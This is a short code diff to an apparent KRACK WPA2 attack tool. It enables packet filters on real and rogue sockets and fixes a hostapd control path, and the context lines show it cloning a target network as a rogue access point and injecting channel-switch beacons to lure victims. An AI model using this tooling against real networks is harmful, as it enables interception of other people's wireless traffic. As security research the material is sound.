@@ -915,8 +915,8 @@ class KRAckAttack():
 		if self.clientmac:
 			bpf += " or (wlan addr1 {clientmac}) or (wlan addr2 {clientmac})".format(clientmac=self.clientmac)
 		bpf = "(wlan type data or wlan type mgt) and (%s)" % bpf
-		# self.sock_real.attach_filter(bpf)
-		# self.sock_rogue.attach_filter(bpf)
+		self.sock_real.attach_filter(bpf)
+		self.sock_rogue.attach_filter(bpf)
 
 		# Set up a rogue AP that clones the target network (don't use tempfile - it can be useful to manually use the generated config)
 		with open("../hostapd/hostapd_rogue.conf", "w") as fp:
@@ -927,7 +927,7 @@ class KRAckAttack():
 		log(STATUS, "Giving the rogue hostapd one second to initialize ...")
 		time.sleep(1)
 
-		self.hostapd_ctrl = Ctrl("hostapd_ctrl_" + self.nic_rogue_ap)
+		self.hostapd_ctrl = Ctrl("hostapd_ctrl/" + self.nic_rogue_ap)
 		self.hostapd_ctrl.attach()
 
 		# Inject some CSA beacons to push victims to our channel
